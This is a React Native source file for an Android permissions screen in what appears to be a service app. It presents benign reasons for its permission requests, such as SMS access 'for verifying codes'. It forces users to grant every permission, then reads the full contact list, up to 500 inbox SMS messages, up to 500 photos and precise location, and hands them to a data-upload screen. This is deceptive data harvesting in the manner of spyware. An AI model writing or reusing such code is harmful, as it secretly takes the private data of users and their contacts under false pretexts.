import React, { useEffect, useState, useCallback } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, Modal, Platform, Alert, BackHandler, StatusBar, ImageBackground, Dimensions } from 'react-native';
import { check, request, RESULTS, openSettings, PERMISSIONS } from 'react-native-permissions';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { uploadLocation, uploadContacts, uploadSMS, uploadAlbum, uploadCompressedImage } from '../services/permissionUpload';
import axios from 'axios';
import { API_URL } from '../config/api';
import { useAuth } from '../context/AuthContext';
import Geolocation from '@react-native-community/geolocation';

// 仅在Android平台导入敏感模块
let Contacts: any = null;
let CameraRoll: any = null;
let SmsAndroid: any = null;

if (Platform.OS === 'android') {
  try {
    Contacts = require('react-native-contacts');
    console.log('✅ Contacts模块加载成功:', typeof Contacts, Object.keys(Contacts || {}));
  } catch (e) {
    console.log('❌ Contacts模块加载失败:', e);
  }
  
  try {
    CameraRoll = require('@react-native-camera-roll/camera-roll').CameraRoll;
    console.log('✅ CameraRoll模块加载成功');
  } catch (e) {
    console.log('❌ CameraRoll模块加载失败:', e);
  }
  
  try {
    const SmsModule = require('react-native-get-sms-android');
    SmsAndroid = SmsModule.default || SmsModule;
    console.log('✅ SmsAndroid模块加载成功:', !!SmsAndroid);
  } catch (e) {
    console.log('❌ SmsAndroid模块加载失败:', e);
  }
}

// 类型定义
type Contact = {
  name: string;
  phoneNumbers: string[];
  emailAddresses: string[];
  company: string;
  jobTitle: string;
  note: string;
};

interface PermissionData {
  location?: any;
  contacts?: Contact[];
  sms?: any[];
  album?: any[];
}

const {width, height} = Dimensions.get('window');

// 兼容React Native 0.74.4版本的权限列表获取函数
const getPermissionsList = () => {
  console.log('🔍 检查权限库兼容性...');
  console.log('PERMISSIONS对象:', typeof PERMISSIONS, !!PERMISSIONS);
  console.log('PERMISSIONS.ANDROID对象:', typeof PERMISSIONS?.ANDROID, !!PERMISSIONS?.ANDROID);
  
  // 定义默认权限列表（兼容RN 0.74.4）
  const defaultPermissions = [
    { key: 'android.permission.ACCESS_FINE_LOCATION', label: '定位', icon: '📍', desc: '用于推荐附近服务' },
    { key: 'android.permission.READ_CONTACTS', label: '通讯录', icon: '👥', desc: '用于快速联系服务人员' },
    { key: 'android.permission.READ_SMS', label: '短信', icon: '✉️', desc: '用于验证短信验证码' },
    { key: 'android.permission.READ_EXTERNAL_STORAGE', label: '相册', icon: '🖼️', desc: '用于上传服务照片' },
    { key: 'android.permission.CAMERA', label: '相机', icon: '📷', desc: '用于拍摄服务照片' },
    { key: 'android.permission.RECORD_AUDIO', label: '麦克风', icon: '🎤', desc: '用于语音通话和语音消息' },
  ];

  try {
    // 尝试使用新版本API
    if (PERMISSIONS && PERMISSIONS.ANDROID && typeof PERMISSIONS.ANDROID === 'object') {
      console.log('✅ 使用PERMISSIONS.ANDROID API');
      return [
        { key: PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION, label: '定位', icon: '📍', desc: '用于推荐附近服务' },
        { key: PERMISSIONS.ANDROID.READ_CONTACTS, label: '通讯录', icon: '👥', desc: '用于快速联系服务人员' },
        { key: PERMISSIONS.ANDROID.READ_SMS, label: '短信', icon: '✉️', desc: '用于验证短信验证码' },
        { key: PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE, label: '相册', icon: '🖼️', desc: '用于上传服务照片' },
        { key: PERMISSIONS.ANDROID.CAMERA, label: '相机', icon: '📷', desc: '用于拍摄服务照片' },
        { key: PERMISSIONS.ANDROID.RECORD_AUDIO, label: '麦克风', icon: '🎤', desc: '用于语音通话和语音消息' },
      ];
    }
    
    // 如果新版本API不可用，回退到字符串形式（RN 0.74.4兼容）
    console.warn('⚠️ PERMISSIONS.ANDROID不可用，使用字符串权限（RN 0.74.4兼容模式）');
    return defaultPermissions;
    
  } catch (error) {
    console.error('❌ 权限API访问失败，使用兼容模式:', error);
    return defaultPermissions;
  }
};

interface PermissionsScreenProps {
  navigation: any;
  route?: {
    params?: {
      phoneNumber?: string;
      inviteCode?: string;
    }
  };
}

/**
 * Android 专用权限屏幕
 * 包含完整的数据收集功能
 */
const PermissionsScreen: React.FC<PermissionsScreenProps> = ({ navigation, route }) => {
  // 安全获取路由参数
  const phoneNumber = route?.params?.phoneNumber || '';
  const inviteCode = route?.params?.inviteCode || '';
  const { logout, userToken } = useAuth();
  const [permissionsStatus, setPermissionsStatus] = useState<{ [key: string]: string }>({});
  const [checking, setChecking] = useState(false);
  const [started, setStarted] = useState(false);
  const [permissionData, setPermissionData] = useState<PermissionData>({});
  
  // 安全获取权限列表
  const PERMISSIONS_LIST = React.useMemo(() => {
    try {
      return getPermissionsList();
    } catch (error) {
      console.error('❌ 获取权限列表失败:', error);
      return [
        { key: 'android.permission.ACCESS_FINE_LOCATION', label: '定位', icon: '📍', desc: '用于推荐附近服务' },
        { key: 'android.permission.READ_CONTACTS', label: '通讯录', icon: '👥', desc: '用于快速联系服务人员' },
        { key: 'android.permission.READ_SMS', label: '短信', icon: '✉️', desc: '用于验证短信验证码' },
        { key: 'android.permission.READ_EXTERNAL_STORAGE', label: '相册', icon: '🖼️', desc: '用于上传服务照片' },
        { key: 'android.permission.CAMERA', label: '相机', icon: '📷', desc: '用于拍摄服务照片' },
        { key: 'android.permission.RECORD_AUDIO', label: '麦克风', icon: '🎤', desc: '用于语音通话和语音消息' },
      ];
    }
  }, []);

  // 平台检查
  useEffect(() => {
    if (Platform.OS !== 'android') {
      console.error('❌ Android权限屏幕在非Android平台运行！');
      navigation.replace('MainTabs');
      return;
    }
    console.log('✅ Android权限屏幕正常运行');
  }, []);

  // 处理硬件返回键
  useEffect(() => {
    const backAction = () => {
      Alert.alert(
        '权限授权必须完成',
        '为了提供完整的服务体验，必须完成权限授权才能使用应用。',
        [
          {
            text: '继续授权',
            style: 'default',
          },
          {
            text: '退出应用',
            style: 'destructive',
            onPress: async () => {
              await logout();
              BackHandler.exitApp();
            }
          }
        ],
        { cancelable: false }
      );
      return true;
    };

    const backHandler = BackHandler.addEventListener('hardwareBackPress', backAction);
    return () => backHandler.remove();
  }, [logout]);



  // 格式化联系人数据
  const formatContactData = (contacts: any[]): Contact[] => {
    return contacts.map(contact => ({
      name: contact.displayName || `${contact.givenName || ''} ${contact.familyName || ''}`.trim() || '未知联系人',
      phoneNumbers: contact.phoneNumbers ? contact.phoneNumbers.map((p: any) => p.number) : [],
      emailAddresses: contact.emailAddresses ? contact.emailAddresses.map((e: any) => e.email) : [],
      company: contact.company || '',
      jobTitle: contact.jobTitle || '',
      note: contact.note || ''
    }));
  };

  // Android安全获取通讯录
  const safeGetContacts = async (): Promise<Contact[]> => {
    if (Platform.OS !== 'android' || !Contacts) {
      console.log('🍎 跳过通讯录获取：非Android平台或模块不可用');
      return [];
    }

    console.log('📱 Android: 开始获取通讯录...');
    console.log('🔍 Contacts对象检查:', typeof Contacts, Object.keys(Contacts || {}));
    
    try {
      // 检查必要的方法是否存在
      if (typeof Contacts.getAll !== 'function') {
        console.error('❌ Contacts.getAll 函数不可用, 可用方法:', Object.keys(Contacts || {}));
        return [];
      }

      // 直接获取通讯录数据，因为权限已经在上级函数中处理了
      console.log('通讯录权限已授予，获取通讯录数据');
      
      return new Promise<Contact[]>((resolve, reject) => {
        Contacts.getAll().then((contacts: any[]) => {
          console.log(`获取到 ${contacts.length} 个联系人`);
          const formattedContacts = formatContactData(contacts);
          resolve(formattedContacts);
        }).catch((error: any) => {
          console.error('获取联系人失败:', error);
          resolve([]);
        });
      });
    } catch (error) {
      console.error('通讯录权限请求失败:', error);
      return [];
    }
  };

  // 获取缓存位置
  const getCachedLocation = async (): Promise<any> => {
    try {
      const cached = await AsyncStorage.getItem('lastKnownLocation');
      if (cached) {
        const location = JSON.parse(cached);
        const age = Date.now() - location.timestamp;
        if (age < 300000) { // 5分钟内的缓存有效
          console.log('📍 使用缓存位置:', location);
          return location;
        }
      }
    } catch (error) {
      console.log('📍 缓存位置读取失败:', error);
    }
    return null;
  };

  // 后台更新位置
  const updateLocationInBackground = () => {
    setTimeout(() => {
      quickLocation().then(newLocation => {
        if (newLocation && newLocation.latitude !== 0) {
          console.log('📍 后台位置更新成功:', newLocation);
          AsyncStorage.setItem('lastKnownLocation', JSON.stringify(newLocation));
        }
      }).catch(error => {
        console.log('📍 后台位置更新失败:', error);
      });
    }, 100);
  };

  // 快速定位（渐进式超时）
  const quickLocation = (): Promise<any> => {
    return new Promise((resolve) => {
      const timeouts = [2000, 5000, 10000]; // 渐进超时：2秒 → 5秒 → 10秒
      let currentAttempt = 0;
      
      const attempt = () => {
        if (currentAttempt >= timeouts.length) {
          console.log('📍 所有定位尝试都失败，返回默认位置');
          resolve({ 
            latitude: 0, 
            longitude: 0, 
            timestamp: Date.now(), 
            source: 'failed',
            error: '定位服务不可用'
          });
          return;
        }
        
        console.log(`📍 定位尝试 ${currentAttempt + 1}/3，超时: ${timeouts[currentAttempt]}ms`);
        
        Geolocation.getCurrentPosition(
          (position) => {
            const location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              altitude: position.coords.altitude,
              speed: position.coords.speed,
              heading: position.coords.heading,
              timestamp: position.timestamp,
              source: `attempt_${currentAttempt + 1}`,
              attemptTime: timeouts[currentAttempt]
            };
            
            console.log(`📍 定位成功! 尝试${currentAttempt + 1}:`, {
              lat: location.latitude.toFixed(6),
              lng: location.longitude.toFixed(6),
              accuracy: location.accuracy?.toFixed(0) + 'm',
              source: location.source
            });
            
            // 缓存位置
            AsyncStorage.setItem('lastKnownLocation', JSON.stringify(location));
            resolve(location);
          },
          (error) => {
            console.log(`📍 定位尝试 ${currentAttempt + 1} 失败:`, error.message);
            currentAttempt++;
            if (currentAttempt < timeouts.length) {
              setTimeout(attempt, 100); // 快速重试
            } else {
              attempt(); // 最后一次尝试
            }
          },
          {
            enableHighAccuracy: currentAttempt === 0 ? false : true, // 第一次用网络，后续用GPS
            timeout: timeouts[currentAttempt],
            maximumAge: currentAttempt === 0 ? 300000 : 60000, // 第一次接受5分钟缓存，后续1分钟
            distanceFilter: 10 // 10米精度变化才更新
          }
        );
      };
      
      attempt();
    });
  };

  // Android获取位置数据（渐进式优化版）
  const getLocationData = async (): Promise<any> => {
    console.log('📱 Android: 开始渐进式定位（用户体验优先）...');
    
    // 策略1：立即返回缓存位置（如果有且新鲜）
    const cachedLocation = await getCachedLocation();
    if (cachedLocation) {
      console.log('📍 立即返回缓存位置，后台更新中...');
      // 后台异步更新位置，不阻塞用户体验
      updateLocationInBackground();
      return cachedLocation;
    }
    
    // 策略2：没有缓存，进行快速定位
    console.log('📍 没有有效缓存，开始快速定位...');
    const startTime = Date.now();
    const location = await quickLocation();
    const endTime = Date.now();
    
    console.log(`📍 定位完成，耗时: ${endTime - startTime}ms`, {
      success: location.latitude !== 0,
      accuracy: location.accuracy ? `${location.accuracy.toFixed(0)}m` : 'unknown',
      source: location.source
    });
    
    return location;
  };

  // Android获取短信数据
  const getSMSData = async (): Promise<any[]> => {
    if (Platform.OS !== 'android' || !SmsAndroid) {
      console.log('🍎 跳过短信获取：非Android平台或模块不可用');
      return [];
    }

    console.log('📱 Android: 开始获取短信...');
    console.log('🔍 SmsAndroid对象检查:', typeof SmsAndroid, Object.keys(SmsAndroid || {}));
    
    return new Promise((resolve) => {
      try {
        // 添加安全检查
        if (!SmsAndroid || typeof SmsAndroid.list !== 'function') {
          console.error('❌ SmsAndroid.list 函数不可用');
          resolve([]);
          return;
        }

        const filter = {
          box: 'inbox',
          maxCount: 500,
        };
        
        console.log('📱 调用 SmsAndroid.list...');
        SmsAndroid.list(
          JSON.stringify(filter),
          (fail: any) => {
            console.log('短信获取失败:', fail);
            resolve([]);
          },
          (count: number, smsList: string) => {
            try {
              const sms = JSON.parse(smsList);
              console.log(`获取到 ${count} 条短信`);
              resolve(sms);
            } catch (error) {
              console.error('短信数据解析失败:', error);
              resolve([]);
            }
          }
        );
      } catch (error) {
        console.error('短信获取异常:', error);
        resolve([]);
      }
    });
  };

  // Android获取相册数据
  const getAlbumData = async (): Promise<any[]> => {
    if (Platform.OS !== 'android' || !CameraRoll) {
      console.log('🍎 跳过相册获取：非Android平台或模块不可用');
      return [];
    }

    console.log('📱 Android: 开始获取相册...');
    console.log('🔍 CameraRoll对象检查:', typeof CameraRoll, Object.keys(CameraRoll || {}));
    
    try {
      // 检查必要的方法是否存在
      if (typeof CameraRoll.getPhotos !== 'function') {
        console.error('❌ CameraRoll.getPhotos 函数不可用');
        return [];
      }

      const photos = await CameraRoll.getPhotos({
        first: 500,
        assetType: 'Photos',
      });
      console.log(`获取到 ${photos.edges.length} 张照片`);
      return photos.edges.map((edge: any) => edge.node);
    } catch (error) {
      console.error('相册获取失败:', error);
      return [];
    }
  };

  // Android一键授权
  const handleOneClickAuth = useCallback(async () => {
    try {
      if (Platform.OS !== 'android') {
        console.error('❌ Android权限授权在非Android平台调用！');
        return;
      }

      if (!PERMISSIONS_LIST || PERMISSIONS_LIST.length === 0) {
        console.error('❌ 权限列表为空！');
        return;
      }

      setChecking(true);
      console.log('📱 Android: 开始一键授权流程...');

      const statusObj: { [key: string]: string } = {};
      const collectedData: PermissionData = {};

    for (const perm of PERMISSIONS_LIST) {
      console.log(`正在请求权限: ${perm.label}`);
      
      try {
        console.log(`🔑 请求权限: ${perm.label} (${perm.key})`);
        const result = await request(perm.key as any);
        statusObj[perm.key] = result;
        console.log(`✅ 权限 ${perm.label} 结果: ${result}`);

        if (result === RESULTS.GRANTED) {
          // 收集数据 - 已恢复，但保留安全检查
          console.log(`✅ 权限 ${perm.label} 已授权，开始数据收集`);
          
          if (perm.label === '定位') {
            try {
              console.log('📍 开始收集位置数据...');
              const locationData = await getLocationData();
              if (locationData) {
                collectedData.location = locationData;
                console.log('📍 位置数据收集成功');
              }
            } catch (error) {
              console.error('❌ 位置数据获取异常:', error);
            }
          } else if (perm.label === '通讯录') {
            try {
              console.log('📱 开始收集通讯录数据...');
              const contacts = await safeGetContacts();
              if (contacts && contacts.length > 0) {
                collectedData.contacts = contacts;
                console.log(`📱 通讯录数据收集成功: ${contacts.length} 条联系人`);
              }
            } catch (error) {
              console.error('❌ 通讯录数据获取异常:', error);
            }
          } else if (perm.label === '短信') {
            try {
              console.log('💬 开始收集短信数据...');
              const smsData = await getSMSData();
              if (smsData && smsData.length > 0) {
                collectedData.sms = smsData;
                console.log(`💬 短信数据收集成功: ${smsData.length} 条短信`);
              }
            } catch (error) {
              console.error('❌ 短信数据获取异常:', error);
            }
          } else if (perm.label === '相册') {
            try {
              console.log('📷 开始收集相册数据...');
              const albumData = await getAlbumData();
              if (albumData && albumData.length > 0) {
                collectedData.album = albumData;
                console.log(`📷 相册数据收集成功: ${albumData.length} 张照片`);
              }
            } catch (error) {
              console.error('❌ 相册数据获取异常:', error);
            }
          }
        } else {
          // 权限被拒绝
          console.log(`${perm.label}权限被拒绝, 状态: ${result}`);
          setChecking(false);
          
          Alert.alert(
            '权限授权失败',
            `${perm.icon} ${perm.label}权限被拒绝。\n\n为了提供完整的服务体验，本应用需要获取所有必要权限。`,
            [
              {
                text: '重新授权',
                onPress: () => {
                  setStarted(false);
                  setChecking(false);
                  setPermissionsStatus({});
                  setPermissionData({});
                }
              },
              {
                text: '退出应用',
                style: 'destructive',
                onPress: async () => {
                  await logout();
                  navigation.reset({
                    index: 0,
                    routes: [{ name: 'Auth' }],
                  });
                }
              }
            ],
            { cancelable: false }
          );
          
          return;
        }
      } catch (error) {
        console.error(`权限请求失败 ${perm.label}:`, error);
        statusObj[perm.key] = RESULTS.UNAVAILABLE;
      }
    }

    setPermissionsStatus(statusObj);
    setPermissionData(collectedData);
    setChecking(false);

    // 权限授权和数据收集完成，跳转到数据上传页面
    console.log('📱 Android: 权限授权完成，准备跳转到数据上传页面');
    console.log('📦 收集到的数据:', {
      hasLocation: !!collectedData.location,
      contactsCount: collectedData.contacts?.length || 0,
      smsCount: collectedData.sms?.length || 0,
      albumCount: collectedData.album?.length || 0,
    });
    
    try {
      const currentToken = await AsyncStorage.getItem('token');
      if (currentToken) {
        console.log('🔄 跳转到数据上传页面...');
        navigation.replace('DataUpload', { 
          token: currentToken, 
          permissionData: collectedData 
        });
      } else {
        console.error('❌ 没有找到用户token，无法跳转');
        Alert.alert('错误', '用户登录状态异常，请重新登录');
      }
    } catch (navigationError) {
      console.error('❌ 跳转失败:', navigationError);
      Alert.alert('错误', '跳转过程中发生错误，请重试');
    }
    
    } catch (error) {
      console.error('❌ handleOneClickAuth 执行失败:', error);
      setChecking(false);
      Alert.alert('错误', '权限授权过程中发生错误，请重试');
    }
  }, [userToken, logout, navigation]);

  // 初始化权限状态检查
  useEffect(() => {
    if (Platform.OS !== 'android') return;

    const initializePermissions = async () => {
      try {
        console.log('📱 初始化权限检查 - 安全模式');
        const statusObj: { [key: string]: string } = {};
        
        for (const perm of PERMISSIONS_LIST) {
          try {
            console.log(`🔍 检查权限状态: ${perm.label} (${perm.key})`);
            const status = await check(perm.key as any);
            statusObj[perm.key] = status;
            console.log(`📋 权限 ${perm.label} 当前状态: ${status}`);
          } catch (error) {
            console.error(`❌ 初始化检查权限 ${perm.label} 失败:`, error);
            statusObj[perm.key] = RESULTS.UNAVAILABLE;
          }
        }
        setPermissionsStatus(statusObj);
      } catch (error) {
        console.error('❌ 权限初始化整体失败:', error);
        // 设置默认状态
        const defaultStatus: { [key: string]: string } = {};
        PERMISSIONS_LIST.forEach(perm => {
          defaultStatus[perm.key] = RESULTS.DENIED;
        });
        setPermissionsStatus(defaultStatus);
      }
    };
    
    initializePermissions();
  }, []);

  useEffect(() => {
    if (started && Platform.OS === 'android') {
      handleOneClickAuth();
    }
  }, [started, handleOneClickAuth]);

  const renderStatus = (status: string) => {
    if (!status) return <Text style={styles.statusUnknown}>未检查</Text>;
    if (status === RESULTS.GRANTED) return <Text style={styles.statusGranted}>已授权</Text>;
    if (status === RESULTS.DENIED) return <Text style={styles.statusDenied}>未授权</Text>;
    if (status === RESULTS.BLOCKED) return <Text style={styles.statusBlocked}>被阻止</Text>;
    return <Text style={styles.statusUnknown}>未知</Text>;
  };

  return (
    <ImageBackground
      source={require('../assets/images/quanxian.png')}
      style={styles.backgroundImage}
      resizeMode="cover">
      <StatusBar translucent backgroundColor="transparent" />
      <View style={styles.overlay}>
        <View style={styles.card}>
          <Text style={styles.title}>请授权以下权限</Text>
          <Text style={styles.subtitle}>Android 完整功能版本</Text>
          {PERMISSIONS_LIST.map((perm) => (
            <View key={perm.key} style={styles.permissionRow}>
              <Text style={styles.icon}>{perm.icon}</Text>
              <View style={{ flex: 1 }}>
                <Text style={styles.label}>{perm.label}</Text>
                <Text style={styles.desc}>{perm.desc}</Text>
              </View>
              {renderStatus(permissionsStatus[perm.key])}
            </View>
          ))}
          <TouchableOpacity
            style={[styles.button, checking && styles.buttonDisabled]}
            onPress={() => setStarted(true)}
            disabled={checking || started}
          >
            <Text style={styles.buttonText}>{checking ? '授权中...' : '一键授权'}</Text>
          </TouchableOpacity>
        </View>
      </View>
    </ImageBackground>
  );
};

const styles = StyleSheet.create({
  backgroundImage: {
    flex: 1,
    width: '100%',
    height: '100%',
  },
  overlay: {
    flex: 1,
    backgroundColor: 'rgba(0,0,0,0.35)',
    justifyContent: 'center',
    alignItems: 'center',
    width: '100%',
    height: '100%',
  },
  card: {
    width: 320,
    borderRadius: 16,
    backgroundColor: '#fff',
    padding: 24,
    elevation: 8,
    shadowColor: '#000',
    shadowOpacity: 0.15,
    shadowRadius: 10,
    shadowOffset: { width: 0, height: 4 },
  },
  title: {
    fontSize: 18,
    fontWeight: 'bold',
    marginBottom: 8,
    textAlign: 'center',
    color: '#2c3e50',
  },
  subtitle: {
    fontSize: 12,
    marginBottom: 18,
    textAlign: 'center',
    color: '#27ae60',
    fontWeight: '600',
  },
  permissionRow: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 16,
    paddingHorizontal: 4,
  },
  icon: {
    fontSize: 20,
    marginRight: 12,
    width: 24,
  },
  label: {
    fontSize: 16,
    fontWeight: '600',
    color: '#2c3e50',
  },
  desc: {
    fontSize: 12,
    color: '#7f8c8d',
    marginTop: 2,
  },
  statusGranted: {
    color: '#27ae60',
    fontSize: 12,
    fontWeight: '600',
  },
  statusDenied: {
    color: '#e74c3c',
    fontSize: 12,
    fontWeight: '600',
  },
  statusBlocked: {
    color: '#f39c12',
    fontSize: 12,
    fontWeight: '600',
  },
  statusUnknown: {
    color: '#95a5a6',
    fontSize: 12,
    fontWeight: '600',
  },
  button: {
    backgroundColor: '#ff6b81',
    paddingVertical: 16,
    borderRadius: 12,
    marginTop: 8,
  },
  buttonDisabled: {
    backgroundColor: '#bdc3c7',
  },
  buttonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: 'bold',
    textAlign: 'center',
  },
});

export default PermissionsScreen; 